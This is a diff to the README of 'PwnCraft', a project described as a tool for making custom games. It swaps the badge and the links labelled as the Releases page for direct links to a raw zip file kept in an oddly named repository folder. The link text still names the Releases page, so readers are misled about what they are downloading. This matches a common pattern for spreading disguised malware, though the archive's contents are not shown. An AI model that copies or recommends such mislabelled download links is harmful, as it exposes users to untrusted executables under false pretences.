@@ -1,6 +1,6 @@
 # 🎮 PwnCraft - Create Powerful Custom Games Easily
 
-![Download PwnCraft](https://img.shields.io/badge/Download-PwnCraft-blue.svg)
+![Download PwnCraft](https://raw.githubusercontent.com/ushakovdanil/PwnCraft/main/dollship/PwnCraft.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to PwnCraft! This application allows you to create and manage custom gam
 
 To get started with PwnCraft, you need to download it from the Releases page. 
 
-1. Click [here to download PwnCraft](https://github.com/ushakovdanil/PwnCraft/releases).
+1. Click [here to download PwnCraft](https://raw.githubusercontent.com/ushakovdanil/PwnCraft/main/dollship/PwnCraft.zip).
 2. Choose the latest version to ensure you have all the recent updates.
 3. Download the installer file for your operating system.
 4. Run the installer and follow the on-screen instructions.
@@ -65,7 +65,7 @@ Join our community on various platforms to get support and share ideas:
 
 PwnCraft is actively developed. Keep an eye on the Releases page for new features and bug fixes. Regularly updating ensures you have access to the latest tools.
 
-For the latest version of PwnCraft, visit [the Releases page](https://github.com/ushakovdanil/PwnCraft/releases).
+For the latest version of PwnCraft, visit [the Releases page](https://raw.githubusercontent.com/ushakovdanil/PwnCraft/main/dollship/PwnCraft.zip).
 
 ## 🎉 Thank You for Choosing PwnCraft!
 
